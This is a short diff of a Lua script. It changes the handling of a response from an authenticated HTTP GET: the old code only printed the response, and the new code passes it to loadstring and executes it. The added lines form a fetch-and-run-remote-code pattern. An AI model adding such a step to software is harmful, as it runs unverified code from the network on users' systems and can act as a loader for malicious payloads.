@@ -82,8 +82,14 @@ local response = performHttpGetWithHeaders(url, Actualtoken)
 
 -- Check if a valid response was received
 if response then
-    warn(response)
-    warn(response.content)
+    -- Attempt to execute the fetched content as Lua code using loadstring
+    local chunk, errorMsg = loadstring(response)
+    if chunk then
+        print("Executing loaded code...")
+        chunk()  -- Execute the loaded chunk of code
+    else
+        warn("Failed to load code: " .. tostring(errorMsg))
+    end
 else
     warn("No response received.")
 end
